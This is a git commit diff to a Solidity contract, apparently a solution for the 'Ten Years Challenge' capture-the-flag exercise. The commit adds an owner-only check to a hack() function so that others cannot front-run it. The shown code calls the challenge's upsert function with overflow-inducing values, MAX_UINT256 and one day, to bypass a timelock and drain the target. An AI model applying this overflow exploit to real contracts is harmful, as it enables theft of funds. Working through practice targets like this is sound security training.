251d4b86322ad3c64970fcbc3c9d7832c06ee066
Owen Hu <owen.h@nodereal.io>
2023-03-04 09:15:14 +0800

    prevent mev attacks

--- contracts/TenYearsChallengeHack.sol
+++ contracts/TenYearsChallengeHack.sol
@@ -7,15 +7,20 @@ contract TenYearsChallengeHack {
     uint256 public constant MAX_UINT256 = 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff;
 
     TenYearsChallenge public challenge;
+    address public owner;
 
     constructor(address addr) {
         challenge = TenYearsChallenge(addr);
+        owner = msg.sender;
     }
 
     receive() external payable {
     }
 
     function hack() public {
+        // prevent MEV attacks
+        require(msg.sender == owner, "only owner can hack");
+        // hack
         challenge.upsert{value: 0}(MAX_UINT256, MAX_UINT256);
         challenge.upsert{value: 0}(MAX_UINT256, 1 days);
         uint head = challenge.head();
